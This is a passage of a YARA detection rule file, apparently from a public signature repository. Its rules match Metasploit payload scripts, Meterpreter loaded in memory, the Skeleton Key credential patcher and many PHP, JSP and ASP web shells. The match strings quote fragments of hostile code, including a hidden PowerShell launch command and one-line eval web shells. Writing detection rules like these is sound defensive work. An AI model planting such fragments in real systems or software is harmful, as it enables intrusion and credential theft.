		$s1 = "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal" ascii
		$s2 = "= VirtualAlloc(0, UBound(Tsw), &H1000, &H40)" fullword ascii
		$s3 = "= RtlMoveMemory(" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_8
{
	meta:
		description = "Metasploit Payloads - file msf.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "54466663-12ef-5fa4-a13c-e80ddbc0f4f8"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L196-L215"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d2b26276843cdfef2d1458ee6c3e2ecea962d1cd42bc21b86ebd03599bebcbc6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "519717e01f0cb3f460ef88cd70c3de8c7f00fb7c564260bd2908e97d11fde87f"

	strings:
		$s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii
		$s2 = "[DllImport(\"msvcrt.dll\")]" fullword ascii
		$s3 = "-Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii
		$s4 = "::VirtualAlloc(0,[Math]::Max($" ascii
		$s5 = ".Length,0x1000),0x3000,0x40)" ascii
		$s6 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii
		$s7 = "::memset([IntPtr]($" ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_Cmd
{
	meta:
		description = "Metasploit Payloads - file msf-cmd.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "71d42c34-a0b0-5173-8f2f-f48a7af0e4ff"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L217-L230"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ea44b3d00733eb7d4f924ccaece5265fcd90a462acb954a134b5355ecb0621e5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "9f41932afc9b6b4938ee7a2559067f4df34a5c8eae73558a3959dd677cb5867f"

	strings:
		$x1 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_11
{
	meta:
		description = "Metasploit Payloads - file msf.hta"
		author = "Florian Roth (Nextron Systems)"
		id = "59b0cced-ffdc-5f2f-878c-856883ee275f"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L287-L302"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f003989a99315b42c0c73beaa2928d0187fe92a4bf329912d64fac9f8fc9358c"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "d1daf7bc41580322333a893133d103f7d67f5cd8a3e0f919471061d41cf710b6"

	strings:
		$s1 = ".ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") Then" fullword ascii
		$s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s3 = "= CreateObject(\"Wscript.Shell\") " fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Meterpreter_Inmemory
{
	meta:
		description = "Detects Meterpreter in-memory"
		author = "netbiosX, Florian Roth"
		id = "29c3bb7e-4da8-5924-ada7-2f28d9352009"
		date = "2020-06-29"
		modified = "2023-04-21"
		reference = "https://www.reddit.com/r/purpleteamsec/comments/hjux11/meterpreter_memory_indicators_detection_tooling/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L341-L363"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4b39dbcb276842a1306205cf2e51ce86b6d2aa21353d277df15f4ea3b3d97678"
		score = 85
		quality = 85
		tags = ""

	strings:
		$sxc1 = { 6D 65 74 73 72 76 2E 64 6C 6C 00 00 52 65 66 6C 
               65 63 74 69 76 65 4C 6F 61 64 65 72 }
		$sxs1 = "metsrv.x64.dll" ascii fullword
		$ss1 = "WS2_32.dll" ascii fullword
		$ss2 = "ReflectiveLoader" ascii fullword
		$fp1 = "SentinelOne" ascii wide
		$fp2 = "fortiESNAC" ascii wide
		$fp3 = "PSNMVHookMS" ascii wide

	condition:
		(1 of ( $sx* ) or 2 of ( $s* ) ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_Skeleton_Key_Patcher
{
	meta:
		description = "Skeleton Key Patcher from Dell SecureWorks Report http://goo.gl/aAk3lN"
		author = "Dell SecureWorks Counter Threat Unit"
		id = "a2805cce-7605-58a4-85ce-9dff5586858e"
		date = "2015-01-13"
		modified = "2023-12-05"
		reference = "http://goo.gl/aAk3lN"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_skeletonkey.yar#L3-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "451b77152e38a120bd8d8a832f0f7c003974113ead18aabfe043a332fb1f484c"
		score = 70
		quality = 85
		tags = ""

	strings:
		$target_process = "lsass.exe" wide
		$dll1 = "cryptdll.dll"
		$dll2 = "samsrv.dll"
		$name = "HookDC.dll"
		$patched1 = "CDLocateCSystem"
		$patched2 = "SamIRetrievePrimaryCredentials"
		$patched3 = "SamIRetrieveMultiplePrimaryCredentials"

	condition:
		all of them
}

rule SIGNATURE_BASE_Skeleton_Key_Injected_Code
{
	meta:
		description = "Skeleton Key injected Code http://goo.gl/aAk3lN"
		author = "Dell SecureWorks Counter Threat Unit"
		id = "29daaffa-cd9d-55d3-b79d-cde1c76e9e45"
		date = "2015-01-13"
		modified = "2023-12-05"
		reference = "http://goo.gl/aAk3lN"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_skeletonkey.yar#L26-L46"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e87cb9a49d0df6f75ca1ae51f8255ea476b699e82d525d7eca06bfda3462d84b"
		score = 70
		quality = 85
		tags = ""

	strings:
		$injected = { 33 C0 85 C9 0F 95 C0 48 8B 8C 24 40 01 00 00 48 33 CC E8 4D 02 00 00 48 81 C4 58 01 00 00 C3 }
		$patch_CDLocateCSystem = { 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48 8B FA 8B F1 E8 ?? ?? ?? ?? 48 8B D7 8B CE 48 8B D8 FF 50 10 44 8B D8 85 C0 0F 88 A5 00 00 00 48 85 FF 0F 84 9C 00 00 00 83 FE 17 0F 85 93 00 00 00 48 8B 07 48 85 C0 0F 84 84 00 00 00 48 83 BB 48 01 00 00 00 75 73 48 89 83 48 01 00 00 33 D2 }
		$patch_SamIRetrievePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 49 8B F9 49 8B F0 48 8B DA 48 8B E9 48 85 D2 74 2A 48 8B 42 08 48 85 C0 74 21 66 83 3A 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 14 E8 ?? ?? ?? ?? 4C 8B CF 4C 8B C6 48 8B D3 48 8B CD FF 50 18 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }
		$patch_SamIRetrieveMultiplePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 41 8B F9 49 8B D8 8B F2 8B E9 4D 85 C0 74 2B 49 8B 40 08 48 85 C0 74 22 66 41 83 38 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 12 E8 ?? ?? ?? ?? 44 8B CF 4C 8B C3 8B D6 8B CD FF 50 20 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }

	condition:
		any of them
}

rule SIGNATURE_BASE_Codoso_PGV_PVID_3
{
	meta:
		description = "Detects Codoso APT PGV PVID Malware"
		author = "Florian Roth (Nextron Systems)"
		id = "08003dba-1201-5f74-9edd-ea321bb26e99"
		date = "2016-01-30"
		modified = "2023-12-05"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_codoso.yar#L295-L314"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "371a91b08747b8025baba79797baf9f29487f9c3541f27fc2c2716b531d30b54"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "126fbdcfed1dfb31865d4b18db2fb963f49df838bf66922fea0c37e06666aee1"
		hash2 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
		hash3 = "8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761"
		hash4 = "b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1"
		hash5 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
		hash6 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"

	strings:
		$x1 = "Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012" fullword wide

	condition:
		$x1
}

rule SIGNATURE_BASE_WEBSHELL_H4Ntu_Shell_Powered_Tsoi_3
{
	meta:
		description = "Web Shell - file h4ntu shell powered by tsoi.php"
		author = "Florian Roth"
		id = "2a493748-85eb-561e-98b3-0eed82026510"
		date = "2014-01-28"
		modified = "2025-03-21"
		old_rule_name = "Webshell_h4ntu_shell_powered_by_tsoi_"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L32-L47"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "871e9a057ca3920fcebaec5c2555c2d936d813c0d8bb2a6a69726dee7a796ff8"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
		$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
		$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_PHP_Sql
{
	meta:
		description = "Web Shell - file sql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L65-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2cf20a207695bbc2311a998d1d795c35"
		logic_hash = "83049c3c5bce88d239b59accb173e234c3169f59187de17b7e6c2a0aa58a552f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
		$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_A
{
	meta:
		description = "Web Shell - file a.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L80-L95"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e3b461f7464d81f5022419d87315a90d"
		logic_hash = "6bdd5fbe9b16f2d84b884239cf3b6453587933c6b0c4308508d10019b4f36e38"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
		$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
		$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Imhapftp_2
{
	meta:
		description = "Web Shell - file iMHaPFtp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L96-L110"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "12911b73bc6a5d313b494102abcf5c57"
		logic_hash = "9099504870c1e466808060f11aea38472832846d24e3c84fdd69b7d26bfed69d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
		$s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Jspspyweb
{
	meta:
		description = "Web Shell - file Jspspyweb.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L111-L125"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4e9be07e95fff820a9299f3fb4ace059"
		logic_hash = "491d9c4efee27469f2a26f6fcb7f7c768eac60977e640096ea5f78ff346e7fbe"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
		$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2
{
	meta:
		description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L126-L140"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d3d27d80f5f3adbc050a59d0c25953ec5d634344b5d051a4abdf4eeed3b8b035"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
		$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker_Vrsion_1_0_0_Priv8_4_My_Friend
{
	meta:
		description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L141-L155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "fc553942b06b305f7b0d5b072a8d4517b0e51229545440ea9c43e9be01d64efa"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
		$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Phpshell_2_1_Pwhash
{
	meta:
		description = "Web Shell - file pwhash.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L156-L170"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ba120abac165a5a30044428fac1970d8"
		logic_hash = "616c0570550cdb9394b5675864d4eec3fa62390f880817406b2a3b63952b69f0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
		$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Phpremoteview
{
	meta:
		description = "Web Shell - file PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L171-L185"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "2de48b8640c0f2089a4a0badb4429127cb61ac972459290041e20b959e4e0c05"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Jsp_12302
{
	meta:
		description = "Web Shell - file 12302.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L186-L201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a3930518ea57d899457a62f372205f7f"
		logic_hash = "0959a138abc791f17344e25e84b24888ddfe238981fc7e3ffd76c0390006ea46"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
		$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Caidao_Shell_Guo
{
	meta:
		description = "Web Shell - file guo.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L202-L216"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9e69a8f499c660ee0b4796af14dc08f0"
		logic_hash = "efb7055f42dd6be41ea3983cacea1a70b83675c8ebcb88ae3b250066a29e94eb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php ($www= $_POST['ice'])!"
		$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_PHP_Redcod
{
	meta:
		description = "Web Shell - file redcod.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L217-L231"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5c1c8120d82f46ff9d813fbe3354bac5"
		logic_hash = "eddfd90d27793756bcc685ffe33b2dabc3bb28b9654c33a0f99359e8b6f13678"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
		$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Remview_Fix
{
	meta:
		description = "Web Shell - file remview_fix.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L232-L246"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"
		logic_hash = "0b29ef74fb0786aefe99281360dc4fe27005eac345a36bc14259afa6fc555303"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
		$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Asp_Cmd
{
	meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L247-L262"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "895ca846858c315a3ff8daa7c55b3119"
		logic_hash = "8e72b54267c2f83b288cdd43ccd56ae4ab1f95c17f4dde077e637d951df54866"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Sh_Server
{
	meta:
		description = "Web Shell - file server.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L263-L276"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d87b019e74064aa90e2bb143e5e16cfa"
		logic_hash = "9f4d940a381e7bd298a252f485d5f1d26fd191c27f6e86e8fa6028237592a8c3"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(getenv('HTTP_CODE'));" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PH_Vayv_PH_Vayv
{
	meta:
		description = "Web Shell - file PH Vayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L277-L291"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "35fb37f3c806718545d97c6559abd262"
		logic_hash = "8769400b7b6828849f27092d790d291721c7e1b39dfd2080de5da8e59dd25523"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
		$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Caidao_Shell_Ice
{
	meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L292-L305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6560b436d3d3bb75e2ef3f032151d139"
		logic_hash = "d92cc9ac8630b40f23b9ff7cda5a237b4885d30de4b9b497be7512e7eb020a09"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%eval request(\"ice\")%>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Shell
{
	meta:
		description = "Web Shell - file shell.asp"
